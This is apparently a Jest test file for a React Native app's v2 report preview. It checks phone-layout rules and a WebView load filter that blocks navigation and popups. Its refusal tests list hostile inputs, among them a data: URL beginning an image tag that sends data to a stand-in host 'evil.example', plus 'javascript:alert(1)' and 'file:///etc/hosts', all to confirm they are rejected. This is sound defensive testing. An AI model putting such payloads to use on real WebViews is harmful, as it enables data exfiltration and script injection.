// The v2 preview's pure rules (PR-17, CUL-2297 + CUL-2383).
import { readFileSync } from 'fs';
import { join } from 'path';
import { FRAME_LOCK_SCRIPT } from './examRoom';
import {
  androidTextZoom,
  bandSlotFor,
  hasPhonePreview,
  isBareV2Report,
  PREVIEW_TOGGLE_LABEL,
  REPORT_FRAME_PROPS,
  reportFrameLoadAllowed,
} from './reportPreviewV2';

const ROOT = join(__dirname, '..');

describe('hasPhonePreview', () => {
  it('needs the v2 document AND its phone layout', () => {
    expect(hasPhonePreview({ reportVersion: 'v2', phoneHtml: '<html>p</html>' })).toBe(true);
    expect(hasPhonePreview({ reportVersion: 'v2', phoneHtml: null })).toBe(false);
    expect(hasPhonePreview({ reportVersion: 'v2', phoneHtml: '' })).toBe(false);
    // A v1 report never previews as v2, whatever else rides on it.
    expect(hasPhonePreview({ reportVersion: 'v1', phoneHtml: '<html>p</html>' })).toBe(false);
  });
});

describe('bandSlotFor', () => {
  it('draws the slot only on the outline\'s positive answer', () => {
    const live = (state: 'flags' | 'none' | 'incomplete') => ({ state, startDate: '2026-06-01', endDate: '2026-07-02', flags: [] });
    expect(bandSlotFor(live('flags'))).toBe(true);
    expect(bandSlotFor(live('none'))).toBe(false);
    expect(bandSlotFor(live('incomplete'))).toBe(false);
    expect(bandSlotFor(null)).toBe(false);
    expect(bandSlotFor(undefined)).toBe(false);
  });
});

describe('androidTextZoom', () => {
  it('carries the font scale as a percentage', () => {
    expect(androidTextZoom(1)).toBe(100);
    expect(androidTextZoom(1.3)).toBe(130);
    expect(androidTextZoom(2)).toBe(200);
  });
  it('reads an unreadable scale as 100', () => {
    expect(androidTextZoom(Number.NaN)).toBe(100);
    expect(androidTextZoom(0)).toBe(100);
    expect(androidTextZoom(-1)).toBe(100);
  });
});

it('the toggle names where the tap goes', () => {
  expect(PREVIEW_TOGGLE_LABEL.phone).toBe('View as printed');
  expect(PREVIEW_TOGGLE_LABEL.printed).toBe('View on phone');
});

describe('isBareV2Report (CUL-2458)', () => {
  it('a v2 response without a usable phone layout is bare; a whole v2 or any v1 is not', () => {
    expect(isBareV2Report({ reportVersion: 'v2', phoneHtml: null })).toBe(true);
    expect(isBareV2Report({ reportVersion: 'v2', phoneHtml: '' })).toBe(true);
    expect(isBareV2Report({ reportVersion: 'v2', phoneHtml: ' \n\t ' })).toBe(true);
    expect(isBareV2Report({ reportVersion: 'v2', phoneHtml: '<html>p</html>' })).toBe(false);
    expect(isBareV2Report({ reportVersion: 'v1', phoneHtml: null })).toBe(false);
  });
});

describe('reportFrameLoadAllowed: the one load check every v2 report frame passes (CUL-2494, CUL-2469)', () => {
  it('admits the inline document, about:blank in the top frame', () => {
    expect(reportFrameLoadAllowed({ url: 'about:blank' })).toBe(true);
    expect(reportFrameLoadAllowed({ url: 'about:blank', isTopFrame: true })).toBe(true);
  });
  it('refuses every data: navigation: the page leaving itself for a document with no CSP', () => {
    for (const url of [
      'data:text/html,<img src="https://evil.example/?d=',
      'data:text/html;charset=utf-8,<html></html>',
      'data:text/html;base64,PGltZz4=',
      'DATA:text/html,x',
      'data:,',
    ]) {
      expect(reportFrameLoadAllowed({ url })).toBe(false);
    }
  });
  it('refuses every sub-frame load (iOS asks with isTopFrame: false), even about:blank', () => {
    expect(reportFrameLoadAllowed({ url: 'about:blank', isTopFrame: false })).toBe(false);
    expect(reportFrameLoadAllowed({ url: 'about:srcdoc', isTopFrame: false })).toBe(false);
  });
  it('refuses about:srcdoc and every other way off the document', () => {
    for (const url of ['about:srcdoc', 'about:blank#x', 'about:blankx', 'https://example.com', 'http://example.com', 'file:///etc/hosts', 'javascript:alert(1)', 'nyx://reports', 'blob:null/x', '']) {
      expect(reportFrameLoadAllowed({ url })).toBe(false);
    }
  });
});

describe('REPORT_FRAME_PROPS: the props every v2 report WebView spreads (CUL-2469)', () => {
  it('sends every URL to the one check, opens no window, and injects the frame lock', () => {
    expect(REPORT_FRAME_PROPS.originWhitelist).toEqual(['*']);
    expect(REPORT_FRAME_PROPS.onShouldStartLoadWithRequest).toBe(reportFrameLoadAllowed);
    expect(REPORT_FRAME_PROPS.onOpenWindow()).toBeUndefined();
    // Android never runs onCreateWindow, so no popup WebView or document exists to script.
    expect(REPORT_FRAME_PROPS.setSupportMultipleWindows).toBe(false);
    expect(REPORT_FRAME_PROPS.javaScriptCanOpenWindowsAutomatically).toBe(false);
    expect(REPORT_FRAME_PROPS.injectedJavaScriptBeforeContentLoaded.startsWith(FRAME_LOCK_SCRIPT)).toBe(true);
    expect(REPORT_FRAME_PROPS.injectedJavaScriptBeforeContentLoadedForMainFrameOnly).toBe(false);
  });

  // A frame that passes its own check, whitelist or window handler drifts from the others; one
  // that skips the spread has none of them. Every <WebView in a report frame's file is read,
  // the live v1 preview's included (CUL-2527).
  const FRAMES: Record<string, number> = {
    'components/reportV2/ReportPreviewV2.tsx': 2,
    'app/exam-room.tsx': 2,
    'app/reports/[id].tsx': 1,
    'app/report.tsx': 1,
  };
  it.each(Object.entries(FRAMES))('%s: every WebView spreads REPORT_FRAME_PROPS and overrides none of it', (file, count) => {
    const src = readFileSync(join(ROOT, file), 'utf8');
    const tags = src.split('<WebView').slice(1).map((t) => t.slice(0, t.indexOf('/>')));
    expect(tags).toHaveLength(count);
    for (const tag of tags) {
      expect(tag).toContain('{...REPORT_FRAME_PROPS}');
      for (const prop of Object.keys(REPORT_FRAME_PROPS)) expect(tag).not.toMatch(new RegExp(`\\b${prop}=`));
    }
    expect(src).not.toMatch(/isPreviewLoadAllowed|savedCopyLoadAllowed/);
  });
});

describe('the installed react-native-webview opens no popup document (CUL-2469)', () => {
  const lib = join(ROOT, 'node_modules/react-native-webview');
  it('iOS: createWebViewWithConfiguration always returns nil, so window.open gets null', () => {
    const src = readFileSync(join(lib, 'apple/RNCWebViewImpl.m'), 'utf8');
    const start = src.indexOf('createWebViewWithConfiguration:(WKWebViewConfiguration *)configuration');
    expect(start).toBeGreaterThan(0);
    const body = src.slice(start, src.indexOf('\n}\n', start));
    expect(body.match(/return\s+[^;]+;/g)).toEqual(['return nil;']);
  });
  it('Android: setSupportMultipleWindows reaches the WebView settings, so onCreateWindow never runs', () => {
    const impl = readFileSync(join(lib, 'android/src/main/java/com/reactnativecommunity/webview/RNCWebViewManagerImpl.kt'), 'utf8');
    expect(impl).toMatch(/fun setSetSupportMultipleWindows\([^)]*value: Boolean\)[\s\S]{0,200}settings\.setSupportMultipleWindows\(value\)/);
    const mgr = readFileSync(join(lib, 'android/src/newarch/com/reactnativecommunity/webview/RNCWebViewManager.java'), 'utf8');
    expect(mgr).toContain('@ReactProp(name = "setSupportMultipleWindows")');
  });
});
